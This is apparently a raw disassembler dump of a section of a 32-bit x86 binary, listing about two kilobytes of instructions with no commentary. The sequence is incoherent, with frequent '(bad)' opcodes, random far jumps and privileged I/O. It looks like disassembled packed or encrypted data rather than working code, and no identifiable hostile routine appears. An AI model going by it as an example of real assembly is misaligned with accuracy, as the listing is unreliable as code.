  41373d:	fcmovne st,st(2)
  41373f:	lock inc ebx
  413741:	cmp    DWORD PTR [ebp+0x66],0xf1bf247e
  413748:	pushf  
  413749:	cmp    DWORD PTR [eax-0x207e8410],esi
  41374f:	and    cl,BYTE PTR [eax+0x441eb127]
  413755:	jmp    0xa842:0x60d5b9c9
  41375c:	jmp    0x41371a
  41375e:	cmp    BYTE PTR [edx-0x621bcd6c],cl
  413764:	pop    edi
  413765:	mov    ebp,0xe9115122
  41376a:	mov    ds:0x9aa218c8,al
  41376f:	sbb    ecx,DWORD PTR ss:[ecx+0x76]
  413773:	shufps xmm2,xmm3,0x5e
  413777:	daa    
  413778:	push   esp
  413779:	xlat   BYTE PTR ds:[ebx]
  41377a:	jmp    0x413729
  41377c:	or     ah,dh
  41377e:	sbb    al,0x2f
  413780:	dec    eax
  413781:	ret    0x792b
  413784:	and    al,0xa2
  413786:	push   esi
  413787:	or     bl,BYTE PTR [edi+0xa]
  41378a:	pop    ebx
  41378b:	add    eax,0xefdebe42
  413790:	nop
  413791:	pusha  
  413792:	hlt    
  413793:	jecxz  0x41377f
  413795:	loop   0x41377a
  413797:	stos   DWORD PTR es:[edi],eax
  413798:	push   0x1469f640
  41379d:	(bad)  
  41379e:	xlat   BYTE PTR ds:[ebx]
  41379f:	xchg   BYTE PTR [esi+0x52],al
  4137a2:	jae    0x413794
  4137a4:	lods   al,BYTE PTR ds:[esi]
  4137a5:	xchg   ebp,eax
  4137a6:	out    dx,al
  4137a7:	(bad)  
  4137a8:	shl    BYTE PTR [esi-0x2],1
  4137ab:	mov    bl,0x56
  4137ad:	sti    
  4137ae:	(bad)  
  4137af:	fisttp DWORD PTR [esi+0x46542cb8]
  4137b5:	xchg   ebp,eax
  4137b6:	aam    0x3a
  4137b8:	inc    ecx
  4137b9:	or     al,0x7e
  4137bb:	sub    dh,BYTE PTR [ebx+eiz*1+0xb212978]
  4137c2:	pop    esi
  4137c3:	out    0xaa,al
  4137c5:	fsub   st(4),st
  4137c7:	dec    edx
  4137c8:	inc    ecx
  4137c9:	adc    al,0xad
  4137cb:	aas    
  4137cc:	inc    ebx
  4137cd:	pop    esp
  4137ce:	out    0xb5,al
  4137d0:	mov    ch,0xff
  4137d2:	xor    ebx,eax
  4137d4:	mov    eax,0x5d72a7c6
  4137d9:	stos   DWORD PTR es:[edi],eax
  4137da:	cli    
  4137db:	pop    es
  4137dc:	cmp    ch,ah
  4137de:	push   ds
  4137df:	mov    edi,0xf94b573d
  4137e4:	not    DWORD PTR [esp+ebx*2-0xf]
  4137e8:	mov    ah,0xcc
  4137ea:	into   
  4137eb:	xchg   ecx,eax
  4137ec:	rcr    DWORD PTR [edx],1
  4137ee:	mov    al,0xf0
  4137f0:	jl     0x4137e8
  4137f2:	inc    esp
  4137f3:	fiadd  WORD PTR [ebx-0x43]
  4137f6:	mov    ch,0x6
  4137f8:	lods   eax,DWORD PTR ds:[esi]
  4137f9:	lds    esi,FWORD PTR [esi-0x3f]
  4137fc:	inc    eax
  4137fd:	mov    BYTE PTR [ebx-0x63],al
  413800:	inc    ebx
  413801:	imul   esi,DWORD PTR [ecx],0xa244a2c4
  413807:	in     eax,dx
  413808:	shl    DWORD PTR [eax-0x5b14b4fa],1
  41380e:	cmp    DWORD PTR [eax+0x2d2fd7f8],0x7959cd66
  413818:	push   edx
  413819:	adc    eax,0xffeda5d0
  41381e:	or     eax,0x3e6ffee9
  413823:	lock jecxz 0x413875
  413826:	xchg   ecx,eax
  413827:	or     ah,cl
  413829:	xor    esi,edx
  41382b:	dec    esi
  41382c:	sub    al,0xc4
  41382e:	xor    bl,BYTE PTR [edi-0x25]
  413831:	and    al,0xe4
  413833:	jnp    0x41386d
  413835:	cmp    al,0xdf
  413837:	fsub   QWORD PTR [eax-0x3836cac1]
  41383d:	jp     0x41387b
  41383f:	push   edx
  413840:	jae    0x4137c4
  413842:	mov    dl,0x6b
  413844:	mov    cs,WORD PTR [edx]
  413846:	(bad)  
  413847:	repz ret 
  413849:	push   esi
  41384a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41384b:	inc    ebx
  41384c:	fbstp  TBYTE PTR [esi]
  41384e:	xor    al,0x20
  413850:	ja     0x413841
  413852:	shl    esi,cl
  413854:	push   ss
  413855:	mov    ds:0x4524c67d,al
  41385a:	popf   
  41385b:	rol    eax,cl
  41385d:	outs   dx,DWORD PTR ds:[esi]
  41385e:	push   edi
  41385f:	pop    esi
  413860:	push   edi
  413861:	rcl    BYTE PTR [ebp+0x77],0x41
  413865:	add    eax,0x347dce85
  41386a:	jmp    0x41381a
  41386c:	aaa    
  41386d:	ja     0x4138c0
  41386f:	sub    DWORD PTR [ebp+0x5a306a0],ebx
  413875:	mov    esi,0xbdcee4ed
  41387a:	sbb    BYTE PTR [edx+0x314a42fe],0x4e
  413881:	adc    dh,BYTE PTR ds:[ebx-0x3e]
  413885:	pause  
  413887:	in     eax,dx
  413888:	push   edx
  413889:	push   0xffffffd3
  41388b:	mov    cl,BYTE PTR [edx-0x268bb50b]
  413891:	sahf   
  413892:	mov    dh,0xdc
  413894:	es xor al,0x98
  413897:	jmp    FWORD PTR [ebx]
  413899:	push   eax
  41389a:	push   edi
  41389b:	shl    BYTE PTR [ecx],cl
  41389d:	add    al,al
  41389f:	push   bx
  4138a1:	repz into 
  4138a3:	jle    0x41385f
  4138a5:	sub    BYTE PTR [edi-0xc],0x18
  4138a9:	rcr    DWORD PTR [ecx],0xd1
  4138ac:	(bad)  
  4138ad:	retf   0x9ca5
  4138b0:	or     BYTE PTR [ecx+0x387e9101],bh
  4138b6:	call   0xb696:0xc1f7acf0
  4138bd:	int3   
  4138be:	std    
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	mov    dl,0x6e
  4138c2:	arpl   WORD PTR [edi],si
  4138c4:	sub    esi,DWORD PTR [eax-0x2d077a0e]
  4138ca:	pop    edx
  4138cb:	sbb    eax,0xe6b26ecb
  4138d0:	in     al,0x50
  4138d2:	add    DWORD PTR [eax+0x4],esp
  4138d5:	popa   
  4138d6:	mov    al,ds:0x69ab30dc
  4138db:	sub    edi,DWORD PTR [edx+0x5f7b6ba]
  4138e1:	push   ecx
  4138e2:	add    ah,cl
  4138e4:	xchg   ecx,eax
  4138e5:	xchg   edi,eax
  4138e6:	dec    edi
  4138e7:	pop    ebp
  4138e8:	mov    edx,0xa3dc1103
  4138ed:	push   ds
  4138ee:	adc    esi,DWORD PTR [eax+0x4b06d2e]
  4138f4:	dec    ebp
  4138f5:	das    
  4138f6:	inc    DWORD PTR [ecx]
  4138f8:	jmp    0x7ffc:0xe640566f
  4138ff:	(bad)
  413902:	and    esi,edx
  413904:	jg     0x4138ce
  413906:	adc    al,0x14
  413908:	popa   
  413909:	in     eax,0xde
  41390b:	cmp    al,0xd9
  41390d:	xor    dh,BYTE PTR [ebp-0x57]
  413910:	stc    
  413911:	aaa    
  413912:	xor    ebx,edi
  413914:	in     eax,dx
  413915:	dec    edi
  413916:	or     eax,0x4b52944f
  41391b:	out    0x88,eax
  41391d:	push   ebp
  41391e:	icebp  
  41391f:	jns    0x413988
  413921:	add    eax,0xcf1ab490
  413926:	retf   0x946f
  413929:	xor    BYTE PTR [edi+0x3516e5ad],bh
  41392f:	aas    
  413930:	cmp    DWORD PTR [edx+ebx*2-0x33055646],ebp
  413937:	add    esi,esp
  413939:	fcmovnu st,st(0)
  41393b:	in     eax,0x92
  41393d:	or     edi,DWORD PTR [ebp-0x1b]
  413940:	xor    dl,bh
  413942:	imul   BYTE PTR [edi]
  413944:	sbb    eax,0xd0328e8
  413949:	mov    ds:0xaa03bb1,al
  41394e:	test   al,0xfb
  413950:	test   al,0x51
  413952:	or     DWORD PTR [edx+ebp*2],ecx
  413955:	sbb    ecx,DWORD PTR [ebx+0x6a3a8620]
  41395b:	fwait
  41395c:	xchg   DWORD PTR [ebx],edx
  41395e:	fcomip st,st(2)
  413960:	fldcw  WORD PTR [eax-0x7dad3365]
  413966:	enter  0xd7fb,0x2e
  41396a:	sub    al,0xd0
  41396c:	(bad)  
  41396d:	or     eax,0xc3185608
  413972:	add    BYTE PTR [ecx],0x97
  413975:	inc    esi
  413976:	(bad)  
  413977:	or     dl,BYTE PTR [ecx-0x5204834]
  41397d:	aas    
  41397e:	sub    BYTE PTR [edi-0x1d],0x19
  413982:	sub    al,0x35
  413984:	mov    bl,0x85
  413986:	int3   
  413987:	sbb    ebx,DWORD PTR [eax-0x62ea26a5]
  41398d:	sbb    DWORD PTR [eax],esp
  41398f:	into   
  413990:	out    0x66,eax
  413992:	xor    ebp,DWORD PTR [edx-0x16]
  413995:	rcl    DWORD PTR [ecx],0x76
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	cmp    esi,DWORD PTR [ebp+0x63ee45f5]
  41399f:	rol    DWORD PTR [edx+0x4f8a8830],1
  4139a5:	and    bl,BYTE PTR [esi+edx*4]
  4139a8:	inc    esi
  4139a9:	inc    eax
  4139aa:	into   
  4139ab:	out    dx,eax
  4139ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139ad:	(bad)  
  4139ae:	out    0x4f,eax
  4139b0:	cmc    
  4139b1:	inc    ecx
  4139b2:	xor    eax,0x5d962c43
  4139b7:	adc    eax,0x13d26fa5
  4139bc:	jmp    0x7196:0xf04d0886
  4139c3:	retf   0x7e2f
  4139c6:	mov    BYTE PTR [edi-0x1b0e2d34],dh
  4139cc:	cmp    al,0x12
  4139ce:	out    dx,eax
  4139cf:	iret   
  4139d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139d1:	std    
  4139d2:	bnd jo 0x413a3c
  4139d5:	jmp    0x413a36
  4139d7:	retf   0xa2e5
  4139da:	push   es
  4139db:	inc    esp
  4139dc:	fwait
  4139dd:	xor    ch,BYTE PTR [edx]
  4139df:	or     esi,ebp
  4139e1:	aaa    
  4139e2:	xadd   DWORD PTR [edi-0x15],ecx
  4139e6:	in     eax,dx
  4139e7:	in     eax,dx
  4139e8:	nop
  4139e9:	dec    eax
  4139ea:	and    bh,BYTE PTR [eax-0x27e95221]
  4139f0:	fiadd  WORD PTR [edi+0x1d]
  4139f3:	jno    0x413a6a
  4139f5:	xor    ch,BYTE PTR [ecx]
  4139f7:	jmp    0xc3b1790f
  4139fc:	add    BYTE PTR [ecx],dh
  4139fe:	aad    0x1f
  413a00:	es mov ebx,0x885cc0cd
  413a06:	jnp    0x413a5f
  413a08:	jb     0x413a23
  413a0a:	fs sub al,0x21
  413a0d:	xchg   ebp,eax
  413a0e:	addr16 inc eax
  413a10:	dec    esi
  413a11:	push   0xffffffa0
  413a13:	js     0x413a10
  413a15:	sub    DWORD PTR [eax-0x2a41f03],ebx
  413a1b:	(bad)  
  413a1c:	sbb    esi,DWORD PTR [ecx]
  413a1e:	lds    ebx,FWORD PTR ds:0x7bef4f47
  413a24:	sbb    eax,DWORD PTR [eax+0x69fbde34]
  413a2a:	das    
  413a2b:	ins    DWORD PTR es:[edi],dx
  413a2c:	cmp    DWORD PTR [edx+0x5a0fde85],esp
  413a32:	mov    esi,0x690f4ab
  413a37:	(bad)  
  413a38:	clc    
  413a39:	dec    edx
  413a3a:	or     ecx,DWORD PTR [esi+0x45]
  413a3d:	push   0xffffffa0
  413a3f:	sub    DWORD PTR [ebx+ebx*4-0x3d],esi
  413a43:	ret    
  413a44:	xchg   DWORD PTR [edx-0x307f68c],esi
  413a4a:	stc    
  413a4b:	popa   
  413a4c:	fistp  QWORD PTR [ecx]
  413a4e:	lds    esi,FWORD PTR [esi-0x666c74cb]
  413a54:	es sbb dh,bl
  413a57:	push   esp
  413a58:	xor    dh,BYTE PTR [eax+0x571b51cd]
  413a5e:	stos   BYTE PTR es:[edi],al
  413a5f:	push   esp
  413a60:	mov    ebx,0x3f94e07b
  413a65:	ret    
  413a66:	aaa    
  413a67:	pop    ebp
  413a68:	inc    ecx
  413a69:	push   0x78711c70
  413a6e:	mov    ebx,0x490d03ec
  413a73:	mov    ch,0xe2
  413a75:	test   BYTE PTR [esi-0x5c],bh
  413a78:	popa   
  413a79:	sub    BYTE PTR [ecx-0x38676520],al
  413a7f:	jmp    0x9ab06685
  413a84:	pop    ebp
  413a85:	ret    
  413a86:	lahf   
  413a87:	cwde   
  413a88:	adc    DWORD PTR [ebp+0x2],0xea10f8ea
  413a8f:	mov    DWORD PTR [ebx],eax
  413a91:	dec    ebx
  413a92:	mov    cl,0x45
  413a94:	add    DWORD PTR [ecx+0x1a],0x51656593
  413a9b:	rol    DWORD PTR [edx+0x611b667c],cl
  413aa1:	inc    edi
  413aa2:	lea    esp,[edi-0x3f]
  413aa5:	jbe    0x413a88
  413aa7:	jne    0x413af2
  413aa9:	inc    edi
  413aaa:	mov    BYTE PTR [edi-0x6e],dl
  413aad:	cdq    
  413aae:	mov    esp,DWORD PTR [esi-0x90e670d]
  413ab4:	or     BYTE PTR [esi],bl
  413ab6:	sub    al,0x74
  413ab8:	retf   
  413ab9:	in     al,0x0
  413abb:	mov    WORD PTR [edi+0x36],ds
  413abe:	xchg   al,al
  413ac0:	pop    ebx
  413ac1:	mov    edx,0xbfb1a04f
  413ac6:	cmp    esi,DWORD PTR [edi-0x53]
  413ac9:	sysexit 
  413acb:	int3   
  413acc:	loop   0x413aa4
  413ace:	mov    bh,0x23
  413ad0:	push   0xfffffff1
  413ad2:	push   cs
  413ad3:	stos   DWORD PTR es:[edi],eax
  413ad4:	add    eax,0xb46760c9
  413ad9:	xchg   esp,eax
  413ada:	jecxz  0x413abb
  413adc:	shr    DWORD PTR [ecx],0xfc
  413adf:	lods   al,BYTE PTR ds:[esi]
  413ae0:	repnz out 0xc0,eax
  413ae3:	scas   eax,DWORD PTR es:[edi]
  413ae4:	jmp    0x7bc:0x999304b7
  413aeb:	xchg   esi,eax
  413aec:	loopne 0x413b6c
  413aee:	ror    DWORD PTR [ebx-0xde3a3bc],1
  413af4:	add    ebx,esi
  413af6:	adc    ch,BYTE PTR [eax-0x40]
  413af9:	sub    esp,DWORD PTR [esi+0x10f1ef62]
  413aff:	or     DWORD PTR [ebx-0x16],edx
  413b02:	cs aad 0x2d
  413b05:	and    esi,edx
  413b07:	lea    ebp,[ebx-0x4d]
  413b0a:	ins    DWORD PTR es:[edi],dx
  413b0b:	mov    eax,0x7d369e2f
  413b10:	lahf   
  413b11:	mov    ecx,0xc8f4e994
  413b16:	mov    eax,ds:0x55b232e0
  413b1b:	push   esp
  413b1c:	dec    ebp
  413b1d:	push   0x29
  413b1f:	in     eax,0xce
  413b21:	mov    edi,0x2d28a7d1
  413b26:	sub    eax,0x9d492526
  413b2b:	add    ecx,edi
  413b2d:	or     eax,0xd9ecd9ec
  413b32:	push   ebp
  413b33:	sbb    esp,DWORD PTR [ecx+0x4c]
  413b36:	js     0x413af8
  413b38:	cld    
  413b39:	dec    esp
  413b3a:	xchg   esp,esp
  413b3c:	adc    al,0xb2
  413b3e:	shr    DWORD PTR [ecx+edx*8+0x61ae0538],cl
  413b45:	int3   
  413b46:	scas   eax,DWORD PTR es:[edi]
  413b47:	xlat   BYTE PTR ds:[ebx]
  413b48:	jno    0x413acc
  413b4a:	out    0xad,eax
  413b4c:	fst    QWORD PTR [esi]
  413b4e:	xchg   cl,bl
  413b50:	inc    BYTE PTR [eax+0x68d256c1]
  413b56:	push   edi
  413b57:	jo     0x413b5f
  413b59:	lods   al,BYTE PTR ds:[esi]
  413b5a:	xor    eax,0x29ce732c
  413b5f:	xchg   edx,eax
  413b60:	mov    ds:0xbee21d12,eax
  413b65:	nop
  413b66:	sub    DWORD PTR [esp+ebp*8-0x55d42a99],0x565f1e1
  413b71:	sbb    esp,DWORD PTR [ecx-0x36ea779b]
  413b77:	adc    BYTE PTR [eax-0x219ee9c3],bl
  413b7d:	into   
  413b7e:	mov    ebp,0xf90e0d16
  413b83:	add    esi,DWORD PTR [eax-0x7661b1ac]
  413b89:	or     BYTE PTR [esi-0x19bc4dee],bh
  413b8f:	jb     0x413bd4
  413b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b92:	frstor [edi]
  413b94:	and    eax,0x8d518f7c
  413b99:	outs   dx,BYTE PTR ds:[esi]
  413b9a:	int3   
  413b9b:	int    0xba
  413b9d:	(bad)  
  413b9e:	dec    esi
  413b9f:	rol    DWORD PTR [ecx+0x46],0xf5
  413ba3:	cs loope 0x413bb4
  413ba6:	push   ebp
  413ba7:	mov    BYTE PTR [ebp-0x2],cl
  413baa:	push   edi
  413bab:	jmp    0xe648:0x5f14527f
  413bb2:	cmp    cl,ah
  413bb4:	aam    0xc4
  413bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bb7:	adc    al,0xb
  413bb9:	cwde   
  413bba:	adc    dh,ah
  413bbc:	ror    BYTE PTR [ebx],0xe0
  413bbf:	in     eax,dx
  413bc0:	and    cl,BYTE PTR [edx-0x55]
  413bc3:	xor    ch,BYTE PTR [edx]
  413bc5:	mov    ecx,0xf13b7cb1
  413bca:	mov    ch,0x23
  413bcc:	mov    ds:0xac59caa7,al
  413bd1:	pusha  
  413bd2:	cmp    dl,bh
  413bd4:	jne    0x413b7f
  413bd6:	mov    eax,ds:0x9cb34360
  413bdb:	inc    eax
  413bdc:	fcomp  QWORD PTR [ecx+0x76]
  413bdf:	xor    al,0x3e
  413be1:	repz (bad) 
  413be3:	ret    0x731c
  413be6:	clc    
  413be7:	enter  0x3e5e,0xf2
  413beb:	imul   eax,DWORD PTR [esi+0x722966a9],0xffffffbb
  413bf2:	xchg   edx,eax
  413bf3:	push   edi
  413bf4:	enter  0xf232,0xdd
  413bf8:	and    al,0x72
  413bfa:	adc    eax,0x4f2e3426
  413bff:	mov    eax,0xf43ecae1
  413c04:	pop    ss
  413c05:	and    edi,DWORD PTR [ebx+0x6f74da5]
  413c0b:	cli    
  413c0c:	jg     0x413ba5
  413c0e:	mov    edx,0x32d27da9
  413c13:	cwde   
  413c14:	jns    0x413c2d
  413c16:	mov    esi,0x27ca5e1c
  413c1b:	mov    al,ds:0xeaad37b3
  413c20:	in     eax,0x25
  413c22:	jl     0x413c5f
  413c24:	xor    eax,0x704b13c8
  413c29:	adc    dl,BYTE PTR [eax]
  413c2b:	mov    eax,0x7cbcc1f0
  413c30:	or     BYTE PTR [esi],dl
  413c32:	in     eax,0xed
  413c34:	js     0x413bcd
  413c36:	jo     0x413bd9
  413c38:	and    esp,DWORD PTR [ebx+0x6c0ee434]
  413c3e:	xchg   edx,eax
  413c3f:	push   ebx
  413c40:	xchg   ebx,esi
  413c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c43:	ins    DWORD PTR es:[edi],dx
  413c44:	std    
  413c45:	push   ss
  413c46:	add    DWORD PTR [edi+0x3f],ebx
  413c49:	mov    ebp,0x74953fa6
  413c4e:	sbb    eax,0x9cdacdd7
  413c53:	pop    ebx
  413c54:	sbb    bh,bl
  413c56:	out    dx,eax
  413c57:	xor    esi,DWORD PTR [edx+0x78]
  413c5a:	push   ebp
  413c5b:	inc    ebp
  413c5c:	cdq    
  413c5d:	mov    ebx,0x5781860c
  413c62:	dec    edx
  413c63:	leave  
  413c64:	sbb    eax,0xcbffe4ea
  413c69:	jle    0x413c09
  413c6b:	sub    BYTE PTR [ebp+0x3d62fab4],cl
  413c71:	mov    ebp,DWORD PTR [ebx-0x6e]
  413c74:	mov    bl,0x3c
  413c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c77:	cmp    cl,dl
  413c79:	(bad)  
  413c7b:	std    
  413c7c:	xchg   ebx,eax
  413c7d:	sbb    eax,0x45d10465
  413c82:	aad    0xed
  413c84:	dec    ebp
  413c85:	dec    ebx
  413c86:	add    BYTE PTR [esi+edx*1],bl
  413c89:	inc    esp
  413c8a:	sbb    al,0x72
  413c8c:	jno    0x413ccf
  413c8e:	and    bl,dl
  413c90:	lods   eax,DWORD PTR ds:[esi]
  413c91:	cmp    eax,0x57c62fce
  413c96:	scas   eax,DWORD PTR es:[edi]
  413c97:	cmp    BYTE PTR ds:0x1d301af9,al
  413c9d:	and    edx,eax
  413c9f:	xor    eax,0xc17ca048
  413ca4:	cmp    DWORD PTR [esi+eiz*8-0xf],eax
  413ca8:	xchg   ecx,eax
  413ca9:	into   
  413caa:	mov    ds:0xdd5f908b,eax
  413caf:	fldcw  WORD PTR [eax]
  413cb1:	push   0x50c26c99
  413cb6:	ins    BYTE PTR es:[edi],dx
  413cb7:	pop    edx
  413cb8:	cwde   
  413cb9:	js     0x413c4c
  413cbb:	and    eax,0xae94e266
  413cc0:	xor    edi,ebp
  413cc2:	or     bh,BYTE PTR [ecx-0x714306ab]
  413cc8:	xor    ch,BYTE PTR [esi+0x7]
  413ccb:	int    0x6f
  413ccd:	lahf   
  413cce:	cmp    eax,edx
  413cd0:	sbb    eax,0xc0ed9708
  413cd5:	into   
  413cd6:	and    edi,DWORD PTR [ebx]
  413cd8:	pop    ebx
  413cd9:	ss ret 
  413cdb:	aad    0xda
  413cdd:	and    DWORD PTR [eax-0x3f733bf2],eax
  413ce3:	popf   
  413ce4:	pop    edx
  413ce5:	fisubr WORD PTR [eax-0x35e9566e]
  413ceb:	les    eax,FWORD PTR [esi+0x1e]
  413cee:	pop    ebx
  413cef:	int    0xc0
  413cf1:	enter  0x39c7,0x75
  413cf5:	int3   
  413cf6:	mov    al,ds:0xdfa3993
  413cfb:	fild   WORD PTR gs:[ecx]
  413cfe:	add    edx,DWORD PTR ds:0xabce0a96
  413d04:	sbb    DWORD PTR [esi],ebp
  413d06:	aad    0x92
  413d08:	fld    TBYTE PTR [edi+0x711fc5de]
  413d0e:	rcl    bh,cl
  413d10:	xchg   DWORD PTR [edx+0xd],eax
  413d13:	jnp    0x413d5a
  413d15:	cmp    al,0xd9
  413d17:	sub    al,0x10
  413d19:	and    BYTE PTR [esi-0x2573226d],dl
  413d1f:	stos   BYTE PTR es:[edi],al
  413d20:	(bad)  
  413d21:	jl     0x413d91
  413d23:	(bad)  
  413d24:	xchg   esp,eax
  413d25:	mov    esp,0xb0dae522
  413d2a:	jge    0x413d91
  413d2c:	xchg   edi,eax
  413d2d:	fsubr  st(1),st
  413d2f:	pop    esp
  413d30:	lahf   
  413d31:	push   esp
  413d32:	and    BYTE PTR [eax-0x42],ah
  413d35:	fcom   st(0)
  413d37:	or     al,0xe
  413d39:	pop    ebx
  413d3a:	dec    ebp
  413d3b:	adc    eax,0x8296d519
  413d40:	dec    ebx
  413d41:	(bad)  
  413d42:	es push ebp
  413d44:	jnp    0x413da8
  413d46:	adc    BYTE PTR [edx-0x3f],0xac
  413d4a:	mov    cl,0x93
  413d4c:	inc    esi
  413d4d:	adc    eax,0x9a45794e
  413d52:	loope  0x413d4e
  413d54:	cmp    DWORD PTR [esi-0x48a8a68f],esi
  413d5a:	in     eax,dx
  413d5b:	pop    es
  413d5c:	mov    BYTE PTR [ebp-0x3096268d],ah
  413d62:	and    BYTE PTR [esi],al
  413d64:	aas    
  413d65:	mov    al,0xd7
  413d67:	push   ebx
  413d68:	(bad)  
  413d69:	ror    DWORD PTR [ecx],cl
  413d6b:	pusha  
  413d6c:	add    ah,al
  413d6e:	mov    dh,0x16
  413d70:	(bad)  
  413d71:	push   eax
  413d72:	inc    edx
  413d73:	inc    esp
  413d74:	inc    edi
  413d75:	xchg   esi,eax
  413d76:	sub    eax,0xe3e76463
  413d7b:	scas   eax,DWORD PTR es:[edi]
  413d7c:	out    0x89,eax
  413d7e:	xor    BYTE PTR [eax+0x13c6f42],dl
  413d84:	xchg   ebp,eax
  413d85:	push   edx
  413d86:	rcl    DWORD PTR [eax-0x2],1
  413d89:	or     al,0x41
  413d8b:	push   ss
  413d8c:	ss loope 0x413d25
  413d8f:	mov    dh,0x9d
  413d91:	lds    ebp,FWORD PTR [ebx+0x25]
  413d94:	xchg   edi,eax
  413d95:	push   ebp
  413d96:	cdq    
  413d97:	std    
  413d98:	ss enter 0x6df2,0x53
  413d9d:	mov    ah,0x47
  413d9f:	mov    al,0xd3
  413da1:	ficom  WORD PTR [edi]
  413da3:	jl     0x413d37
  413da5:	cmp    al,0x46
  413da7:	add    cl,BYTE PTR [eax-0x32c2b188]
  413dad:	dec    ecx
  413dae:	aaa    
  413daf:	mov    DWORD PTR [edx],esi
  413db1:	ss xchg esi,eax
  413db3:	fld    TBYTE PTR [eax-0x37bca3c]
  413db9:	cpuid  
  413dbb:	ins    BYTE PTR es:[edi],dx
  413dbc:	ffreep st(2)
  413dbe:	xchg   DWORD PTR [ebx-0x40],esp
  413dc1:	repnz outs dx,BYTE PTR ds:[esi]
  413dc3:	jmp    0x413daf
  413dc5:	outs   dx,BYTE PTR ds:[esi]
  413dc6:	mov    dh,0x98
  413dc8:	test   al,0x97
  413dca:	rol    BYTE PTR [esi-0x7f11cfa5],0xbc
  413dd1:	sub    eax,DWORD PTR [edx+0x21311dc4]
  413dd7:	push   cs
  413dd8:	sbb    dl,BYTE PTR [ebx-0x76]
  413ddb:	fidiv  DWORD PTR [edx]
  413ddd:	pop    ebp
  413dde:	or     BYTE PTR [edi+0x74],al
  413de1:	dec    edx
  413de2:	cli    
  413de3:	xchg   esp,eax
  413de4:	and    DWORD PTR [ebp+0x6f8b6628],esp
  413dea:	out    dx,eax
  413deb:	sti    
  413dec:	mov    edi,0xe95bb7a2
  413df1:	(bad)  
  413df2:	in     al,dx
  413df3:	ror    cl,0xd1
  413df6:	push   ss
  413df7:	aad    0x3b
  413df9:	or     DWORD PTR [esi],edx
  413dfb:	gs loope 0x413e47
  413dfe:	test   DWORD PTR [edi+0x2cc698ec],edi
  413e04:	mov    ah,0xbf
  413e06:	jne    0x413d99
  413e08:	cdq    
  413e09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e0a:	sbb    al,0x17
  413e0c:	pop    es
  413e0d:	fisttp WORD PTR [eax]
  413e0f:	bound  ebx,QWORD PTR [ebx]
  413e11:	pop    ds
  413e12:	stos   DWORD PTR es:[edi],eax
  413e13:	xlat   BYTE PTR ds:[ebx]
  413e14:	or     eax,0xb16a59b7
  413e19:	into   
  413e1a:	jnp    0x413d9d
  413e1c:	daa    
  413e1d:	out    dx,al
  413e1e:	sub    eax,0x7940d7b8
  413e23:	push   0xbf7ebe71
  413e28:	out    0xf0,eax
  413e2a:	repnz rcl eax,cl
  413e2d:	or     esi,DWORD PTR [ebp-0x1d0f4d25]
  413e33:	scas   al,BYTE PTR es:[edi]
  413e34:	mov    al,0xf1
  413e36:	or     eax,0x1be8bc19
  413e3b:	inc    eax
  413e3c:	arpl   cx,sp
  413e3e:	add    DWORD PTR [ebx-0x42],ecx
  413e41:	imul   edx,DWORD PTR [edx+0x3875944],0x27219a00
  413e4b:	icebp  
  413e4c:	in     al,0x17
  413e4e:	add    al,BYTE PTR [edx+0x6ec50b3a]
  413e54:	or     cl,ch
  413e56:	fimul  WORD PTR [ecx+0x23]
  413e59:	pop    esi
  413e5a:	and    al,0x2c
  413e5c:	mov    bl,0x4
  413e5e:	aas    
  413e5f:	dec    ebx
  413e60:	pop    eax
  413e61:	ja     0x413e50
  413e63:	push   ss
  413e64:	xchg   esi,eax
  413e65:	mov    ecx,0x996e88fb
  413e6a:	push   ebx
  413e6b:	fld    QWORD PTR [eax+0x3f47e137]
  413e71:	mov    ch,0xfc
  413e73:	addr16 push ss
  413e75:	lds    ebx,FWORD PTR [eax+ebp*2-0x62]
  413e79:	mov    ecx,DWORD PTR ds:0x14e26c4
  413e7f:	jbe    0x413eed
  413e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e82:	stc    
  413e83:	test   DWORD PTR [esi],esi
  413e85:	or     ecx,DWORD PTR [edx]
  413e87:	in     eax,0x66
  413e89:	popf   
  413e8a:	sub    cl,BYTE PTR [ebp+0x3b]
  413e8d:	in     al,dx
  413e8e:	sub    DWORD PTR [esi-0x7],ebx
  413e91:	pop    ebx
  413e92:	dec    ebx
  413e93:	mov    edi,0x5955ab75
  413e98:	mov    ebp,0xea69cefd
  413e9d:	pop    DWORD PTR [eax+0x9850916]
  413ea3:	notrack jmp DWORD PTR ds:0x2a6533b7
  413eaa:	mov    eax,ds:0x9e4f79a8
  413eaf:	jmp    0x413ef8
  413eb1:	aam    0x36
  413eb3:	adc    al,0xc2
  413eb5:	mov    edi,0x7e46ff92
  413eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ebb:	jns    0x413f2e
  413ebd:	into   
  413ebe:	fnsave [eax+0x30a79187]
  413ec4:	mov    ah,BYTE PTR [ebp+0xf]
  413ec7:	arpl   WORD PTR [edx+0x54f3353f],si
  413ecd:	lahf   
  413ece:	inc    esp
  413ecf:	ins    BYTE PTR es:[edi],dx
  413ed0:	icebp  
  413ed1:	jne    0x413ece
  413ed3:	js     0x413f14
  413ed5:	mov    DWORD PTR [esi+edi*4+0x63],eax
  413ed9:	mov    ss,WORD PTR [bx+di]
  413edc:	icebp  
  413edd:	repnz es stos BYTE PTR es:[edi],al
  413ee0:	mov    ebp,0xa61d4e32
  413ee5:	jl     0x413efd
  413ee7:	sbb    al,0x80
  413ee9:	mov    ah,0x48
  413eeb:	mov    al,0x7b
  413eed:	mov    ch,0xcf
  413eef:	xor    eax,0x4065606b
  413ef4:	sbb    cl,BYTE PTR [ebx]
  413ef6:	add    bl,dh
  413ef8:	push   0x66c184fc
  413efd:	ins    DWORD PTR es:[edi],dx
  413efe:	arpl   WORD PTR [edx+esi*1-0x76ed803c],di
  413f05:	stos   BYTE PTR es:[edi],al
  413f06:	push   esp
  413f07:	lods   al,BYTE PTR ds:[esi]
  413f08:	lds    ecx,FWORD PTR [eax-0x6227489e]
